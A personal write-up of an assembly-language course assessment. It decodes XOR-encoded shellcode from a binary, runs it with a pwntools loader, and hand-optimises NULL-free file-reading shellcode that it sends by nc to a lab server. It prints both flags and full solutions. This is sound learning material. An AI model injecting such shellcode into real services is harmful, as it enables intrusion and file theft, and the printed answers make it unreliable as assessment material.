---
title: Intro to Assembly language - Skills Assessment
date: 2024-04-30
categories: 
    - Writeups
tags: [assembly, binary, shellcoding]
---
<style>
b {color: #0398fc;word-wrap:break-word;}
r {color: #eb6666;word-wrap:break-word;}
g {color: #83a35c;word-wrap:break-word;}
purple {color: #a49cda;word-wrap:break-word;}
</style>

This post is about the end of module assessment given for an introduction to assembly language course. Those are the solutions I came up with, don't mind sending me suggestions for improvement since i'm new to this. Also, this post is mostly for me and to keep track of my progress over time.

## Task 1
For the first task, we're given a binary called <b>loaded_shellcode</b>. We have to dissassemble it, modify the assembly code to decode the shellcode loaded in it, then execute it to get the flag. The decoding key is stored in the register <b>rbx</b> (Callee Saved)

To dissassemble the <b>.text</b> section :  
  
`objdump -M intel --no-show-raw-insn --no-addresses -d loaded_shellcode`
  
```nasm
<_start>:
        movabs rax,0xa284ee5c7cde4bd7
        push   rax
        movabs rax,0x935add110510849a
        push   rax
        movabs rax,0x10b29a9dab697500
        push   rax
        movabs rax,0x200ce3eb0d96459a
        push   rax
        movabs rax,0xe64c30e305108462
        push   rax
        movabs rax,0x69cd355c7c3e0c51
        push   rax
        movabs rax,0x65659a2584a185d6
        push   rax
        movabs rax,0x69ff00506c6c5000
        push   rax
        movabs rax,0x3127e434aa505681
        push   rax
        movabs rax,0x6af2a5571e69ff48
        push   rax
        movabs rax,0x6d179aaff20709e6
        push   rax
        movabs rax,0x9ae3f152315bf1c9
        push   rax
        movabs rax,0x373ab4bb0900179a
        push   rax
        movabs rax,0x69751244059aa2a3
        push   rax
        movabs rbx,0x2144d2144d2144d2
```
  
The encoded shellcode is loaded by initializing the register <b>rax</b> with a value, then pushing it into the stack. This process is repeated <b>14</b> times. At the end, the decoding key is set into the Callee Saved register <b>rbx</b>.

The quickest/easiest approach would be to <b>pop</b> the values from the stack, <b>xor</b> them with the key in <b>rbx</b> and loop these steps 14 times. After that, load the program in a debugger and take note of the decoded value at each step. I wanted to make it just a little more fun by making a procedure that will do these steps, but will also print the entire decoded shellcode in my terminal, ready to be executed as is.
  
The approach I came up with is:
- <b>pop</b> the current stack pointer <b>rsp</b> into a register not used (<b>rdx</b> in my case)  
- <b>xor</b> it with the value in <b>rbx</b>
- print the value in <b>rdx</b> with <b>libc</b> functions <b>printf</b> and <b>fflush</b>
- loop these steps 14 times

The format specifier used for <b>printf</b>:   
`outFormat db  "%016llx", 0x00`

- <b>0</b> : to pad the output with zeroes intead of spaces if minimum width is not met
- <b>16</b> : field width specifier of 16 characters, will be padded to the left with zeros.
- <b>ll</b> : length modifier long long int.
- <b>x</b> : lowercase hexadecimal integer
- <b>0x00</b> is the string terminator in <b>printf</b>

This is necessary because for example, one of the values is: 14831ff40b70148 instead of <b>0</b>14831ff40b70148 which would break the shellcode if I didn't pad the extra <b>0</b>.

Also, to be able to print all the values on the same line, I need to call <b>fflush</b> to flush all streams or else, I'd have to print on a new line instead.

Once this is all put together : 

```nasm
global _start
extern printf, fflush               ; Import external libc functions printf and fflush

section .data
    outFormat db  "%016llx", 0x00   ; Set the format specifier for printf

section .text
_start:
    mov rax,0xa284ee5c7cde4bd7
    push   rax
    mov rax,0x935add110510849a
    push   rax
    mov rax,0x10b29a9dab697500
    push   rax
    mov rax,0x200ce3eb0d96459a
    push   rax
    mov rax,0xe64c30e305108462
    push   rax
    mov rax,0x69cd355c7c3e0c51
    push   rax
    mov rax,0x65659a2584a185d6
    push   rax
    mov rax,0x69ff00506c6c5000
    push   rax
    mov rax,0x3127e434aa505681
    push   rax
    mov rax,0x6af2a5571e69ff48
    push   rax
    mov rax,0x6d179aaff20709e6
    push   rax
    mov rax,0x9ae3f152315bf1c9
    push   rax
    mov rax,0x373ab4bb0900179a
    push   rax
    mov rax,0x69751244059aa2a3
    push   rax
    mov rbx,0x2144d2144d2144d2

    mov rcx, 14                     ; Set the Loop Counter to 14

printDecode:                        ; Start of new procedure printDecode

    pop rdx                         ; Pop the current stack pointer to rdx
    xor rdx, rbx                    ; Decode rdx using the key in rbx

    push rcx                        ; Push registers to stack before calling the printf function
    push rdx                        
    push rbx

    mov rdi, outFormat              ; Set the first printf argument (format specifier)
    mov rsi, rdx                    ; Set the second printf argument (value to print)
    call printf                     ; printf(outFormat, rdx)
    
    xor  rdi, rdi                   ; Setting rdi to zero
    call fflush                     ; Flush all streams

    pop rbx                         ; Restore registers from stack
    pop rdx
    pop rcx

    loop printDecode                ; Loop this procedure until rcx reaches 0

exit:                               ; Exit procedure
    xor rax, rax
    add al, 60
    xor dil, dil
    syscall
```
Assemble the code, do dynamic linking with <b>libc</b> and execute it using :   
`nasm -f elf64 flag.s &&  ld flag.o -o flag -lc --dynamic-linker /lib64/ld-linux-x86-64.so.2 && ./flag`

Result : 
```shell
nasm -f elf64 flag.s &&  ld flag.o -o flag -lc --dynamic-linker /lib64/ld-linux-x86-64.so.2 && ./flag
4831c05048bbe671167e66af44215348bba723467c7ab51b4c5348bbbf264d344bb677435348bb9a10633620e771125348bbd244214d14d244214831c980c1044889e748311f4883c708e2f74831c0b0014831ff40b7014831f64889e64831d2b21e0f054831c04883c03c4831ff0f05
```


To execute the shellcode, I'll use the <b>pwntools</b> library in <b>python</b>:
```python
from pwn import *
context(os="linux", arch="amd64", log_level="error")
run_shellcode(unhex('SHELLCODE')).interactive()
```

I can then execute the shellcode, which will print the flag :

```shell
python loader.py '4831c05048bbe671167e66af44215348bba723467c7ab51b4c5348bbbf264d344bb677435348bb9a10633620e771125348bbd244214d14d244214831c980c1044889e748311f4883c708e2f74831c0b0014831ff40b7014831f64889e64831d2b21e0f054831c04883c03c4831ff0f05'
HTB{4553mbly_d3bugg1ng_m4573r}$
```

## Task 2

For the second task, in a binary exploitation exercise, we get to the point where we have to run our shellcode. A buffer space of 50 bytes is available. The exercice consist of optimizing the given assembly code to make it <b>shellcode-ready</b> and <b>under 50 bytes</b>.

Before starting, a quick reminder about shellcoding requirements : 

1. Does not contain variables
2. Does not refer to direct memory addresses
3. Does not contain any NULL bytes `00`

The provided assembly code :

```nasm
global _start

section .text
_start:
    ; push './flg.txt\x00'
    push 0              ; push NULL string terminator
    mov rdi, '/flg.txt' ; rest of file name
    push rdi            ; push to stack 
    
    ; open('rsp', 'O_RDONLY')
    mov rax, 2          ; open syscall number
    mov rdi, rsp        ; move pointer to filename
    mov rsi, 0          ; set O_RDONLY flag
    syscall

    ; read file
    lea rsi, [rdi]      ; pointer to opened file
    mov rdi, rax        ; set fd to rax from open syscall
    mov rax, 0          ; read syscall number
    mov rdx, 24         ; size to read
    syscall

    ; write output
    mov rax, 1          ; write syscall
    mov rdi, 1          ; set fd to stdout
    mov rdx, 24         ; size to read
    syscall

    ; exit
    mov rax, 60
    mov rdi, 0
    syscall
```

Using this python code, we can generate our shellcode from the binary : 

```python
#!/usr/bin/python3

import sys
from pwn import *

context(os="linux", arch="amd64", log_level="error")

file = ELF(sys.argv[1])
shellcode = file.section(".text")
print(shellcode.hex())

print("%d bytes - Found NULL byte" % len(shellcode)) if [i for i in shellcode if i == 0] else print("%d bytes - No NULL bytes" % len(shellcode))
```


This is the current result : 
```shell
python shellcoder.py flag
6a0048bf2f666c672e74787457b8020000004889e7be000000000f05488d374889c7b800000000ba180000000f05b801000000bf01000000ba180000000f05b83c000000bf000000000f05
75 bytes - Found NULL byte
```


Using pwn disasm we can see the instructions from the shellcode : 
<pre><code>
pwn disasm '6a0048bf2f666c672e74787457b8020000004889e7be000000000f05488d374889c7b800000000ba180000000f05b801000000bf01000000ba180000000f05b83c000000bf000000000f05' -c 'amd64'
   0:    6a <r>00</r>                    <g>push</g> <purple>0x0</purple>
   2:    48 bf 2f 66 6c 67 2e 74 78 74    <g>movabs</g> <r>rdi</r>,  <purple>0x7478742e676c662f</purple>
   c:    57                       <g>push</g> <r>rdi</r>
   d:    b8 02 <r>00 00 00</r>           <g>mov</g> <r>eax</r>,  <purple>0x2</purple>
  12:    48 89 e7                 <g>mov</g> <r>rdi</r>,  <r>rsp</r>
  15:    be <r>00 00 00 00</r>           <g>mov</g> <r>esi</r>,  <purple>0x0</purple>
  1a:    0f 05                    <g>syscall</g>
  1c:    48 8d 37                 <g>lea</g> <r>rsi</r>,  <r>[rdi]</r>
  1f:    48 89 c7                 <g>mov</g> <r>rdi</r>,  <r>rax</r>
  22:    b8 <r>00 00 00 00</r>           <g>mov</g> <r>eax</r>,  <purple>0x0</purple>
  27:    ba 18 <r>00 00 00</r>           <g>mov</g> <r>edx</r>,  <purple>0x18</purple>
  2c:    0f 05                    <g>syscall</g>
  2e:    b8 01 <r>00 00 00</r>           <g>mov</g> <r>eax</r>,  <purple>0x1</purple>
  33:    bf 01 <r>00 00 00</r>           <g>mov</g> <r>edi</r>,  <purple>0x1</purple>
  38:    ba 18 <r>00 00 00</r>           <g>mov</g> <r>edx</r>,  <purple>0x18</purple>
  3d:    0f 05                    <g>syscall</g>
  3f:    b8 3c <r>00 00 00</r>           <g>mov</g> <r>eax</r>,  <purple>0x3c</purple>
  44:    bf 00 <r>00 00 00</r>           <g>mov</g> <r>edi</r>,  <purple>0x0</purple>
  49:    0f 05                    <g>syscall</g>
</code></pre>

As expected, we're exceeding 50 bytes and the shellcode contains NULL bytes (each <r>00</r> represents a null byte that needs to be removed).

Here's the list of changes made to respect the requirements:
- Line 1: replace `push 0` by `xor rsi, rsi` followed by `push rsi`. This will still push 0 to the stack and will replace `mov rsi, 0` from line 13.
- Line 11: `mov al, 2` to use the 1-byte register instead of the 8-byte <b>rax</b>.
- Line 18: replace `mov rdi, rax` by `mov edi, eax' to use 4-byte size registers.
- Line 19: replace `mov rax, 0` by `xor al, al` to set the Syscall number to 0.
- Line 21: replace `mov rdx, 24` by `mov dl, 24` to use a 2-byte register, per needed.
- Line 24-25: replace `mov rax, 1` and `mov rdi, 1` by `mov al, 1` and `mov dil, 1` to use 1-byte registers.
- Line 26: remove `mov rdx, 24` since the value is alredy set previously.

This is the final code:
```nasm
global _start

section .text
_start:
    ; push './flg.txt\x00'
    xor rsi, rsi            ; set rsi to 0
    push rsi                ; push NULL string terminator
    mov rdi, '/flg.txt'     ; set the file name
    push rdi                ; push file name to stack
    
    ; open('rsp', 'O_RDONLY')
    ; rsi '0_RDONLY' is already set to 0 from previous instructions
    mov al, 2               ; open syscall number
    mov rdi, rsp            ; move pointer to filename
    syscall                 

    ; read file
    lea rsi, [rdi]          ; pointer to opened file
    mov edi, eax            ; set fd to rax from open syscall
    xor al, al              ; read syscall number
    mov dl, 24              ; size to read
    syscall

    ; write output
    mov al, 1               ; write syscall
    mov dil, 1              ; set fd to stdout
    syscall
```


If I generate the shellcode and check for null bytes this is the result :
```shell
python shellcoder.py flag
4831f65648bf2f666c672e74787457b0024889e70f05488d3789c730c0b2180f05b00140b7010f05
40 bytes - No NULL bytes
```

Finally, if I send the shellcode to the server the flag is returned :
```shell
$ nc 94.237.63.201 58840
4831f65648bf2f666c672e74787457b0024889e70f05488d3789c730c0b2180f05b00140b7010f05
HTB{5h3llc0d1ng_g3n1u5}
```